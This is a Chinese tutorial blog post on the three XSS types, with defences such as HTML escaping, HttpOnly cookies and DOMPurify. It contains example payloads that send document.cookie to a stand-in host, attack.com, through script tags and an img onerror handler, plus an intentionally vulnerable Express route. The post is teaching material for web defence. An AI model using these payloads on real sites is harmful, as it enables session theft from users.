---
title: 什么是 XSS 攻击？
date: 2020-11-20 20:39:27
sidebar: auto
tags:
  - xss
  - 浏览器安全
categories:
  - 浏览器
---

::: details 为什么 React 元素有一个 `$$typeof` 属性？

目的是为了防止 XSS 攻击。因为 Synbol 无法被序列化，所以 React 可以通过有没有 `$$typeof` 属性来断出当前的 element 对象是从数据库来的还是自己生成的。

如果没有 `$$typeof` 这个属性，react 会拒绝处理该元素。

:::

:::details 快速预览

反射型 XSS 攻击的手段就是诱导用户点击，这种攻击是一次性的，用户点击就中招，不点就没事，危害性不如存储型的大，但是小白用户很容易被盗号。

存储型 XSS 攻击范围广，受害面积大，且不容易及时发现和排查，一定要多加小心，对于用户输入的任何内容都不要完全信任，对于动态渲染的文本一定要进行转义。

DOM 型 XSS 攻击随着单页面应用普及和流行愈发常见，因为在单页面应用中 JS 经常操作 DOM，而 DOM 型 XSS 攻击就是利用了浏览器解析机制，因此很容易触发 DOM 型 XSS 攻击。不过好在大部分前端框架，例如 Vue、Angular 都内置 DOM 型 XSS 攻击的防御机制。

:::

`XSS` 也即跨站脚本攻击，攻击出现的原因一般是因为 Web 程序对**用户的输入过滤不足**导致的一种漏洞，攻击者可以把恶意的脚本代码注入到网页之中，当其他用户浏览时就会执行其中的恶意代码，对受害者产生各种攻击。XSS 一般分为三种类型：

**反射型**、**存储型**、**DOM 型**

## 反射型（url）

反射型 XSS 攻击的恶意脚本并没有被存储到后端数据库中，而是诱导用户点击某个精心拼接的恶意链接，从而达到攻击的目的。

:::: tabs

::: tab 举个例子

一个常见的场景是用户在某电影网站搜索，假如请求地址是：

```js
https://xxx.com/movies?q=功夫熊猫
```

在后台返回的结果页中，会显示用户搜索的电影名，而攻击者拼接了一个极度恶意的链接：

```js
https://xxx.com/movies?q=功夫熊猫<script>fetch(`https://attack.com?cookie=${document.cookie}`)</script>
```

如果用户点击了这个恶意链接，cookie 立马被盗。

:::

::: tab 代码实现

```js
const express = require('express');
const app = express();

app.get('/xss', (req, res) => {
  res.send(`你的搜索内容 ${req.query.search}`);
});

app.listen(3000, () => console.log(`请打开网址 http://localhost:3000/xss?search=Kobe`));
```

打开：`http://localhost:3000/xss?search=<script>alert(document.cookie)</script>`, 可以发现 cookie 被读取了，这是多么危险的事情

:::

::::

造成反射型 XSS 攻击的原因就是服务端没过滤，所以解决方案也很简单，就是在服务器对用户输入进行过滤，过滤方案一般有很多，

```js
const tpl = req.query.q
  ? `<h3>「${encodeURIComponent(req.query.q)}」的搜索结果为：</h3>${Array(30).fill('x')}`
  : `请输入搜索的电影`;
```

还有一种方式是写一个函数替换掉那些 `<`、`&` 等特殊字符：

```js
function encodeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&apos;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}
```

另外，如果后端登录验证是基于 Cookie 的话，一定要设置其属性为 `HttpOnly`，这样攻击者无法利用 JS 脚本获取到 Cookie 了。

## 存储型（表单）

与反射型不同，存储型 XSS 攻击是指当用户的输入包含了恶意脚本，服务端转义就存储到数据库，访问页面会触发恶意脚本执行，而导致的攻击。

假如在某网站上有一篇爆款文章：`https://xxx.com/articles/1`

攻击者在文章下面发表了一篇评论，内容中包含了 script 脚本：

```bash
文章写的真棒！<script>fetch(`http://attack.com/cookies?cookie=${document.cookie}`)</script>
```

如果服务端直接把评论字符串保存到数据库了，下次只要有用户访问该文章时，包含恶意脚本的评论内容被返回，把当前用户的 cookie 发送到攻击者的服务器！

可以看到，用户的 Cookie 马上被发送到了攻击者的服务器。其实这种获取 Cookie 的方式还算小打小闹了，只要能够利用 xss 注入 script，黑客真的是可以「为所欲为」，例如黑客通过操作 DOM 的方式，分分钟把你的网站变成赌博网站、色情网站...，

可以看到，存储型 XSS 也是因为恶意代码未经转义直接被插入到响应的 HTML 里的，然后被浏览器执行导致攻击，所以解决方案也是对用户输入进行过滤，过滤方案与上面讲的反射型一致.

## DOM 型（onerror）

DOM 型 XSS 与反射型或存储型 XSS 的区别在于，DOM 型在服务器返回的网页或脚本中是看不到恶意代码的，而是在更新 DOM 树的时候触发了恶意脚本的执行。

我们来看一则模拟案例，前端开发人员未经过滤就直接把用户输入插入到 HTML 中：

```html
<input id="input" type="text" />
<button onclick="container.innerHTML = input.value">点击</button>
<p id="container"></p>
```

试想一下，如果此时用户输入了下面一段恶意脚本的话会发生什么？

```bash
<script>fetch(`https://attack.com?cookie=${document.cookie}`)</script>
```

值得庆幸的是，大部分现代浏览器都实现了 HTML5 的 [安全规范](https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML)

但是这就足够安全了吗？非也，请看下面的输入：

```html
<img src="x" onerror="fetch(`http://attack.com/cookies?cookie=${document.cookie}`)" />
```

恶意脚本依然在 onerror 回调中被触发了！

这里推荐使用 [DOMPurify](https://github.com/cure53/DOMPurify) 库对用户的输入进行过滤，然后再使用 innerHTML 插入到 DOM 中。

[参考自 XSS 攻防实战](https://juejin.cn/post/6867184627393265677)
